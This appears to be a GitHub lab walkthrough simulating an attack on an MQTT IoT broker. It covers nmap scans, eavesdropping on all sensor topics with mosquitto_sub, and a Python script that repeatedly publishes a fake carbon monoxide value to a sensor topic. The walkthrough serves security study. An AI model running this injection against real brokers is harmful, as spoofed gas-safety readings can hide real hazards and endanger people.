# Steps to Similate the Attack on Victim

## Step - 1: 
In my /etc/hosts file, I've mapped my victim's IP to the alias 'tom' for security purposes. In upcoming simulations, I'll be using 'tom' to represent this IP.

<p align="center">
  <img src="https://github.com/Bhargav9490/MQTT_Attack/blob/main/Attack/Host.jpeg" alt="GitHub Logo" width="400">
</p>

## Step - 2: 
Do an **Nmap scan** on the target ip, Nmap scan (nmap -A tom) was an aggressive scan on tom, focusing only on common ports rather than all possible ones. Key findings:
  - Port 22 (SSH) is open, running OpenSSH 9.6p1 on Ubuntu.
  - SSH Host Keys: Shows both ECDSA and ED25519 keys.
  - OS Detection: The device is running a Linux OS with kernel version 4.x/5.x.
  - Network Distance: 1 hop.
**Note:** This scan did not detect port 1883 (MQTT) as it was outside the scanned port range.

<p align="center">
  <img src="https://github.com/Bhargav9490/MQTT_Attack/blob/main/Attack/nmap.jpeg" alt="GitHub Logo" width="400">
</p>

## Step - 3: 
Do another **Nmap Scan**(nmap -p- tom), the -p- option was used to scan all 65,535 TCP ports on tom (IP: 172.16.17.207). Results show:
  - Port 22: Open (SSH)
  - Port 1880: Open (vsat-control)
  - Port 1883: Open (MQTT)
This confirms that port 1883 (MQTT) is open, as it was not detected in the previous scan due to the limited port range.
<p align="center">
  <img src="https://github.com/Bhargav9490/MQTT_Attack/blob/main/Attack/nmap-p.jpeg" alt="GitHub Logo" width="400">
</p>

## Step - 4: Monitoring Sensor Data Using MQTT
To subscribe to all topics on the MQTT broker and display real-time sensor data, use the following command:
```bash
mosquitto_sub -h tom -p 1883 -t '#' -v
```
This command subscribes to all topics (#) and outputs real-time sensor data with topic names and values, such as gas levels (H2, LPG, CO) and air quality metrics (PM2.5, CO2, TEMP).
<p align="center">
  <img src="https://github.com/Bhargav9490/MQTT_Attack/blob/main/Attack/mosquitto.jpeg" alt="GitHub Logo" width="400">
</p>

## Step - 5: 
Now it time to write a script connects to an MQTT broker and continuously publishes a message to a specified topic with a delay between each publish. The script takes four command-line arguments: broker address, topic, message, and delay.
```bash
import paho.mqtt.client as mqtt
import time
import sys

# Check if the correct number of arguments is provided
if len(sys.argv) != 5:
    print("Usage: script.py <broker_address> <topic> <message> <delay>")
    sys.exit(1)

# Get command-line arguments
broker_address = sys.argv[1]
topic = sys.argv[2]
message = sys.argv[3]
delay = float(sys.argv[4])  # Convert delay to float

print(f"Arguments received - Broker: {broker_address}, Topic: {topic}, Message: {message}, Delay: {delay}")

# Create an MQTT client instance
client = mqtt.Client()

# Connect to the MQTT broker
client.connect(broker_address)

# Continuously send the message to the topic
try:
    while True:
        client.publish(topic, message)
        print(f"Data '{message}' sent to topic {topic}")
        time.sleep(delay)  # Use the delay provided in seconds
except KeyboardInterrupt:
    print("Process interrupted")
finally:
    client.disconnect()
```

Step - 6:
Running the script.py file by adding the broker address, topic, message, and delay.
```bash
python3 script.py tom ZPHS01B/CO '10' 1.00
```
This is the output: 
<p align="center">
  <img src="https://github.com/Bhargav9490/MQTT_Attack/blob/main/Attack/Attack.jpeg" alt="GitHub Logo" width="400">
</p>
